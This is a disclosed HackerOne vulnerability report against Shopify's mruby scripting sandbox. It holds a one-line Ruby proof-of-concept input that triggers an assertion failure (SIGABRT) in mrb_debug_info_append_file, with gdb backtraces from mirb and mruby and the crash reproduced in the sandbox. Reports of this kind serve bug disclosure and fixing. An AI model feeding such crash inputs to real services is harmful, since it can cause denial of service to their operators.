# SIGABRT in mrb_debug_info_append_file

## Report Details
- **Report ID**: 215967
- **URL**: https://hackerone.com/reports/215967
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2017-03-25T08:15:59.018Z
- **Disclosed**: 2017-05-13T21:29:43.335Z

## Reporter
- **Username**: ston3
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: shopify-scripts

## Vulnerability Information
PoC
-------------------

The following code triggers the bug (attached as test_mrb_debug_info_append_file.rb):

	i""do"".+end

mirb
-------------------

	x@x:~/Desktop/test/mruby/bin$ ./mirb test_mrb_debug_info_append_file.rb 
	mirb - Embeddable Interactive Ruby Shell

	mirb: /home/x/Desktop/test/mruby/src/debug.c:136: mrb_debug_info_append_file: Assertion `irep->lines' failed.
	Aborted

Backtrace - mirb
-------------------

	x@x:~/Desktop/test/mruby/bin$ gdb -q ./mirb
	Reading symbols from ./mirb...done.
	(gdb) r test_mrb_debug_info_append_file.rb 
	Starting program: /home/x/Desktop/test/mruby/bin/mirb test_mrb_debug_info_append_file.rb
	mirb - Embeddable Interactive Ruby Shell

	mirb: /home/x/Desktop/test/mruby/src/debug.c:136: mrb_debug_info_append_file: Assertion `irep->lines' failed.

	Program received signal SIGABRT, Aborted.
	0x00007ffff7744f79 in __GI_raise (sig=sig@entry=6) at ../nptl/sysdeps/unix/sysv/linux/raise.c:56
	56	../nptl/sysdeps/unix/sysv/linux/raise.c: No such file or directory.
	(gdb) bt
	#0  0x00007ffff7744f79 in __GI_raise (sig=sig@entry=6) at ../nptl/sysdeps/unix/sysv/linux/raise.c:56
	#1  0x00007ffff7748388 in __GI_abort () at abort.c:89
	#2  0x00007ffff773de36 in __assert_fail_base (fmt=0x7ffff788f718 "%s%s%s:%u: %s%sAssertion `%s' failed.\n%n", assertion=assertion@entry=0x48dbda "irep->lines", file=file@entry=0x48d9c0 "/home/x/Desktop/test/mruby/src/debug.c", 
		line=line@entry=136, function=function@entry=0x48dc50 <__PRETTY_FUNCTION__.3492> "mrb_debug_info_append_file") at assert.c:92
	#3  0x00007ffff773dee2 in __GI___assert_fail (assertion=0x48dbda "irep->lines", file=0x48d9c0 "/home/x/Desktop/test/mruby/src/debug.c", line=136, function=0x48dc50 <__PRETTY_FUNCTION__.3492> "mrb_debug_info_append_file") at assert.c:101
	#4  0x0000000000456bc0 in mrb_debug_info_append_file (mrb=0x6b0010, irep=0x71fd50, start_pos=0, end_pos=0) at /home/x/Desktop/test/mruby/src/debug.c:136
	#5  0x0000000000440f51 in scope_finish (s=0x71bec0) at /home/x/Desktop/test/mruby/mrbgems/mruby-compiler/core/codegen.c:2877
	#6  0x0000000000438242 in lambda_body (s=0x71bec0, tree=0x70e40c, blk=1) at /home/x/Desktop/test/mruby/mrbgems/mruby-compiler/core/codegen.c:725
	#7  0x000000000043a756 in codegen (s=0x715c80, tree=0x70e424, val=1) at /home/x/Desktop/test/mruby/mrbgems/mruby-compiler/core/codegen.c:1397
	#8  0x0000000000438ac1 in gen_call (s=0x715c80, tree=0x70e288, name=0, sp=0, val=1, safe=0) at /home/x/Desktop/test/mruby/mrbgems/mruby-compiler/core/codegen.c:895
	#9  0x000000000043b37f in codegen (s=0x715c80, tree=0x70e2e8, val=1) at /home/x/Desktop/test/mruby/mrbgems/mruby-compiler/core/codegen.c:1585
	#10 0x0000000000439e84 in codegen (s=0x715c80, tree=0x70e224, val=1) at /home/x/Desktop/test/mruby/mrbgems/mruby-compiler/core/codegen.c:1271
	#11 0x00000000004382be in scope_body (s=0x711db0, tree=0x70e46c, val=0) at /home/x/Desktop/test/mruby/mrbgems/mruby-compiler/core/codegen.c:737
	#12 0x000000000043b34b in codegen (s=0x711db0, tree=0x70e46c, val=0) at /home/x/Desktop/test/mruby/mrbgems/mruby-compiler/core/codegen.c:1580
	#13 0x00000000004413ef in mrb_generate_code (mrb=0x6b0010, p=0x70dec0) at /home/x/Desktop/test/mruby/mrbgems/mruby-compiler/core/codegen.c:2984
	#14 0x0000000000402af5 in main (argc=2, argv=0x7fffffffdf28) at /home/x/Desktop/test/mruby/mrbgems/mruby-bin-mirb/tools/mirb/mirb.c:537

mruby
-------------------

	x@x:~/Desktop/test/mruby/bin$ ./mruby test_mrb_debug_info_append_file.rb 
	mruby: /home/x/Desktop/test/mruby/src/debug.c:136: mrb_debug_info_append_file: Assertion `irep->lines' failed.
	Aborted

Backtrace - mruby
-------------------

	x@x:~/Desktop/test/mruby/bin$ gdb -q ./mruby
	Reading symbols from ./mruby...done.
	(gdb) r test_mrb_debug_info_append_file.rb 
	Starting program: /home/x/Desktop/test/mruby/bin/mruby test_mrb_debug_info_append_file.rb
	mruby: /home/x/Desktop/test/mruby/src/debug.c:136: mrb_debug_info_append_file: Assertion `irep->lines' failed.

	Program received signal SIGABRT, Aborted.
	0x00007ffff7744f79 in __GI_raise (sig=sig@entry=6) at ../nptl/sysdeps/unix/sysv/linux/raise.c:56
	56	../nptl/sysdeps/unix/sysv/linux/raise.c: No such file or directory.
	(gdb) bt
	#0  0x00007ffff7744f79 in __GI_raise (sig=sig@entry=6) at ../nptl/sysdeps/unix/sysv/linux/raise.c:56
	#1  0x00007ffff7748388 in __GI_abort () at abort.c:89
	#2  0x00007ffff773de36 in __assert_fail_base (fmt=0x7ffff788f718 "%s%s%s:%u: %s%sAssertion `%s' failed.\n%n", assertion=assertion@entry=0x48bcea "irep->lines", file=file@entry=0x48bad0 "/home/x/Desktop/test/mruby/src/debug.c", 
		line=line@entry=136, function=function@entry=0x48bd60 <__PRETTY_FUNCTION__.3492> "mrb_debug_info_append_file") at assert.c:92
	#3  0x00007ffff773dee2 in __GI___assert_fail (assertion=0x48bcea "irep->lines", file=0x48bad0 "/home/x/Desktop/test/mruby/src/debug.c", line=136, function=0x48bd60 <__PRETTY_FUNCTION__.3492> "mrb_debug_info_append_file") at assert.c:101
	#4  0x0000000000448b7f in mrb_debug_info_append_file (mrb=0x6af010, irep=0x71ee80, start_pos=0, end_pos=0) at /home/x/Desktop/test/mruby/src/debug.c:136
	#5  0x000000000045ada9 in scope_finish (s=0x71aff0) at /home/x/Desktop/test/mruby/mrbgems/mruby-compiler/core/codegen.c:2877
	#6  0x000000000045209a in lambda_body (s=0x71aff0, tree=0x70d52c, blk=1) at /home/x/Desktop/test/mruby/mrbgems/mruby-compiler/core/codegen.c:725
	#7  0x00000000004545ae in codegen (s=0x714db0, tree=0x70d544, val=1) at /home/x/Desktop/test/mruby/mrbgems/mruby-compiler/core/codegen.c:1397
	#8  0x0000000000452919 in gen_call (s=0x714db0, tree=0x70d3a8, name=0, sp=0, val=1, safe=0) at /home/x/Desktop/test/mruby/mrbgems/mruby-compiler/core/codegen.c:895
	#9  0x00000000004551d7 in codegen (s=0x714db0, tree=0x70d408, val=1) at /home/x/Desktop/test/mruby/mrbgems/mruby-compiler/core/codegen.c:1585
	#10 0x0000000000453cdc in codegen (s=0x714db0, tree=0x70d344, val=1) at /home/x/Desktop/test/mruby/mrbgems/mruby-compiler/core/codegen.c:1271
	#11 0x0000000000452116 in scope_body (s=0x710ee0, tree=0x70d58c, val=0) at /home/x/Desktop/test/mruby/mrbgems/mruby-compiler/core/codegen.c:737
	#12 0x00000000004551a3 in codegen (s=0x710ee0, tree=0x70d58c, val=0) at /home/x/Desktop/test/mruby/mrbgems/mruby-compiler/core/codegen.c:1580
	#13 0x000000000045b247 in mrb_generate_code (mrb=0x6af010, p=0x70cfe0) at /home/x/Desktop/test/mruby/mrbgems/mruby-compiler/core/codegen.c:2984
	#14 0x0000000000438ce0 in mrb_load_exec (mrb=0x6af010, p=0x70cfe0, c=0x70bbf0) at /home/x/Desktop/test/mruby/mrbgems/mruby-compiler/core/parse.y:5737
	#15 0x0000000000438f23 in mrb_load_file_cxt (mrb=0x6af010, f=0x70cbe0, c=0x70bbf0) at /home/x/Desktop/test/mruby/mrbgems/mruby-compiler/core/parse.y:5769
	#16 0x0000000000402415 in main (argc=2, argv=0x7fffffffdf28) at /home/x/Desktop/test/mruby/mrbgems/mruby-bin-mruby/tools/mruby/mruby.c:227

	
Sandbox
-------------------

	x@x:~/Desktop/test/mruby/bin$ ../../mruby-engine/bin/sandbox test_mrb_debug_info_append_file.rb 
	ruby: /home/x/Desktop/test/mruby-engine/ext/mruby_engine/mruby/src/debug.c:136: mrb_debug_info_append_file: Assertion `irep->lines' failed.
	Aborted

System information
-------------------

	SHA hash - 051e40c0493f2de332f5439e3230c9fe6958bf1a
	Linux 14.04 x86_64
	gcc version 4.8.4
	

## Attachments
- test_mrb_debug_info_append_file.rb
